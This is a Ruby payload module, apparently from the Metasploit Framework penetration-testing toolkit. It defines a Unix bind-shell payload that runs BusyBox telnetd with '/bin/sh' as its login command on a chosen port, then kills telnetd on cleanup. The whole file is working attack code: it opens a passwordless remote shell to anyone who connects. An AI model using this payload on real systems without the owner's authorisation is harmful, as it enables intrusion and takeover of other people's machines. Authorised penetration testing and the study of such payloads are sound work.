##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 26

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Unix Command Shell, Bind TCP (via BusyBox telnetd)',
        'Description' => 'Listen for a connection and spawn a command shell via BusyBox telnetd',
        'Author' => 'Matthew Kienow <matthew_kienow[AT]rapid7.com>',
        'License' => MSF_LICENSE,
        'Platform' => 'unix',
        'Arch' => ARCH_CMD,
        'Handler' => Msf::Handler::BindTcp,
        'Session' => Msf::Sessions::CommandShell,
        'PayloadType' => 'cmd',
        'RequiredCmd' => 'telnetd',
        'Payload' => {
          'Offsets' => {},
          'Payload' => ''
        }
      )
    )

    register_options(
      [
        OptString.new('LOGIN_CMD', [true, 'Command telnetd will execute on connect', '/bin/sh']),
      ]
    )

    register_advanced_options(
      [
        OptString.new('CommandShellCleanupCommand', [true, 'A command to run before the session is closed', 'pkill telnetd']),
        OptString.new('TelnetdPath', [true, 'The path to the telnetd executable', 'telnetd'])
      ]
    )
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    vprint_good(command_string)
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    "#{datastore['TelnetdPath']} -l #{datastore['LOGIN_CMD']} -p #{datastore['LPORT']}"
  end
end
